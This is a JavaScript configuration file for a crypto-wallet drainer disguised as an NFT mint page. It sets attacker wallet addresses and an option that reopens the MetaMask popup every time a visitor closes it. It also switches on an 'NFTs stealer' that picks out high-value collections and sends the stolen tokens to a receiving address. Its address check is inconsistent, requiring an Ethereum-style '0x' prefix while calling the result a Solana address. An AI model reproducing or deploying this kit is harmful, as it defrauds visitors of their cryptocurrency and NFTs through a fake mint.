const address = "2kSJrWMruLty8ChUzxKeKgopZKm1NQD4txXdfDWN6c7h";

const mintInfo = {
    price: 0.02,         // Price per NFT.
    totalSupply: 1200,   // Total supply of NFTs.
    minUnits: 1,        // Min units to buy.
    maxUnits: 5,        // Max units to buy.
    askMintLoop: true,  // If true, when the user closes the metamask popup, it reopens automatically.
}

const nftsInfo = {
    active: true,   // Active (true) or not (false) NFTs stealer.
    minValue: 0.05,  // Minimum value of the last transactions (in the last 'checkMaxDay' days) of the collection.
    checkMaxDay: 7, // Maximum number of days to check for the last transactions.
    receiveAddress: "EZKGh1Zxo31TZzi2Rgr8VbE5oFJiUqme4mhqE6YECEUC" // leave empty if you want to use the same address 
}

if (mintInfo.minUnits > mintInfo.maxUnits) console.error(`Error: minUnits (${mintInfo.minUnits}) is greater than maxUnits (${maxUnits})`);
if (mintInfo.minUnits <= 0) console.error(`Error: minUnits (${mintInfo.minUnits}) is less than or equal to 0`);

if (!address.startsWith("0x") ||
    (
        address.length >= 64 ||
        address.length <= 40
    )
) console.error(`Error: ${address} is not a valid Solana address.`);